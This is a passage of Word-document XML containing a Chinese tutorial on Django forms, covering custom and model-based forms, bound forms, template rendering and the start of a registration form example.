        </w:rPr>
        <w:t>自定义表单</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090C133C" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>类似模型，Django表单也由各种字段组成。表单可以自定义(forms.Form)，也可以由模型Models创建(forms.ModelForm)。值得注意的是模型里用的是verbose_name来描述一个字段, 而表单用的是label。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F4A9EF1" w14:textId="270B11EE" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CC05B97" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>下面是两个ContactForm的例子。一个自定义，一个从Model创建。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="118CB3F1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django import forms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE530E9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from .models import Contact</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38EBA295" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32C84359" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ContactForm1(forms.Form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ADAE6A3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="359AB347" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    name = forms.CharField(label="Your Name", max_length=255)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455B14BE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    email = forms.EmailField(label="Email address")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30CA6F14" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5DE9F99C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ContactForm2(forms.ModelForm):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18FBDFED" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A633AF8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    class Meta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F0C3E7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        model = Contact</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A869A1A" w14:textId="6BD9F09E" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        fields = ('name', 'email',)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4929A9B0" w14:textId="0786BD8A" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django的常用做法是在app文件夹下创建一个forms.py，专门存放app中所定义的各种表单，这样方便集中管理表单。如果要使用上述表单，我们可以在视图views.py里把它们像模型一样import进来直接使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E5F987B" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>表单实例化</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="146994D5" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>下面方法可以实例化一个空表单，但里面没有任何数据，可以通过 {{ form }}在模板中渲染。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317F634E" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>form = ContactForm()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F117C73" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>用户提交的数据可以通过以下方法与表单结合，生成与数据结合过的表单(Bound forms)。Django只能对Bound forms进行验证。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE0552A" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>form = ContactForm(data=request.POST, files=request.FILES)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2530232C" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>模板文件中使用form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42C20C93" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>模板文件中我们可以通过{{ form.as_p }}, {{ form.as_li }} 和 {{ form.as_table }}中渲染表单。如果你想详细控制每个field的格式，你可以采取以下方式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE19FDC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% block content %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="399A574E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>&lt;div class="form-wrapper"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E922D9F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">   &lt;form method="post" action="" enctype="multipart/form-data"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="776B1BE4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">      {% csrf_token %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75D09FB4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">      {% for field in form %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D05D975" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">           &lt;div class="fieldWrapper"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6420DA54" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        {{ field.errors }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40059F9A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        {{ field.label_tag }} {{ field }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54DD271A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        {% if field.help_text %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C57AB4D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">             &lt;p class="help"&gt;{{ field.help_text|safe }}&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75F59C05" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        {% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD4CA75" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">           &lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="784B2E74" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        {% endfor %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A73BEC2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">      &lt;div class="button-wrapper submit"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B796AFF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">         &lt;input type="submit" value="Submit" /&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BE46C88" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">      &lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DB2BA99" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">   &lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2545E834" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/div&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="472570C3" w14:textId="5A2639DD" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endblock %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0263C348" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>表单实际使用案例</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48475DD9" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们现在需要设计一个表单让用户完成注册。我们先在app目录下新建forms.py, 然后创建一个RegistrationForm。代码如下:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7240BA83" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django import forms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F758AA5" w14:textId="3030C5EF" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.models import User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F8600AB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class RegistrationForm(forms.Form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20E98F68" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FB14FEF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    username = forms.CharField(label='Username', max_length=50)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B69E4AA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
